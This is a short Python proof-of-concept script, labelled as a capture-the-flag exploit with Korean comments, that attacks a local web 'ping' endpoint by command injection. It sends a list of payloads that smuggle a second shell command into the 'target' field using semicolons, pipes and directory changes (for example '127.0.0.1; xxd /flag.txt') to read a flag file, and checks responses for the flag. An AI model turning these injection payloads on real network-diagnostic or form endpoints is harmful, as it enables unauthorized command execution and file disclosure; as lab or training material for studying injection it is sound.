import requests
import time

def try_exploit():
    url = "http://localhost:5555/ping"
    
    # 1. 기본 ping 테스트
    print("[*] Testing basic ping functionality...")
    data = {"target": "127.0.0.1"}
    r = requests.post(url, data=data)
    print("[*] Response:", r.text)
    
    # 2. Command Injection 시도
    print("\n[*] Attempting command injection...")
    
    payloads = [
        # 세미콜론을 사용한 명령어 체이닝
        "127.0.0.1; xxd /flag.txt",
        "127.0.0.1; od /flag.txt",
        "127.0.0.1; rev /flag.txt",
        
        # 파이프를 사용한 명령어 체이닝
        "127.0.0.1 | xxd /flag.txt",
        "127.0.0.1 | od /flag.txt",
        "127.0.0.1 | rev /flag.txt",
        
        # 상대 경로를 사용한 시도
        "127.0.0.1; xxd ../flag.txt",
        "127.0.0.1; xxd ./flag.txt",
        
        # 다른 디렉토리에서 시도
        "127.0.0.1; cd /; xxd flag.txt",
        "127.0.0.1; cd /; od flag.txt"
    ]
    
    for payload in payloads:
        print(f"\n[*] Trying payload: {payload}")
        r = requests.post(url, data={"target": payload})
        print("[*] Response:", r.text)
        
        if "MCP{" in r.text:
            print("[+] Exploit successful! Flag found!")
            return True
    
    print("[-] All exploit attempts failed!")
    return False

if __name__ == "__main__":
    print("=== CTF Command Injection POC ===")
    try_exploit()